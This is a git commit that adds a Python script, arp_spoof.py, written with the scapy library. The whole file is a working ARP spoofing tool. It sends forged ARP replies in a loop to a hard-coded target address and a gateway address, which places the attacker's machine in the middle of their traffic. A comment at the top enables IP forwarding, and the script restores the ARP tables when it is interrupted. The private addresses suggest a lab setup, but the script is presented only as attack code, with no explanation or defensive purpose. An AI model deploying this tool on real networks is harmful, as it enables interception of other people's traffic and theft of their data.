ee62008ce406fb25b6c5abbc985e91432d5752be
Robert Paruch <roobbb@live.com>
2020-06-28 03:36:05 -0700

    Create arp_spoof.py

---
+++ arp_spoof/arp_spoof.py
@@ -0,0 +1,43 @@
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+import scapy.all as sc
+import time
+
+
+def get_mac(ip):
+    arp_request = sc.ARP(pdst=ip)
+    broadcast = sc.Ether(dst='ff:ff:ff:ff:ff:ff')
+    arp_request_broadcast = broadcast/arp_request
+    answered_list = sc.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    return answered_list[0][1].hwsrc
+
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    sc.send(packet, verbose=False)
+
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = sc.ARP(op=2, pdst=destination_ip,
+                    hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    sc.send(packet, count=4, verbose=False)
+
+
+target_ip = '10.0.2.15'
+gateway_ip = '10.0.2.1'
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count += 2
+        print(f'\r[+] Packets sent: {sent_packets_count}', end='')
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('\n[-] Detected Ctrl + C... Resetting ARP tables... Please wait.\n')
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
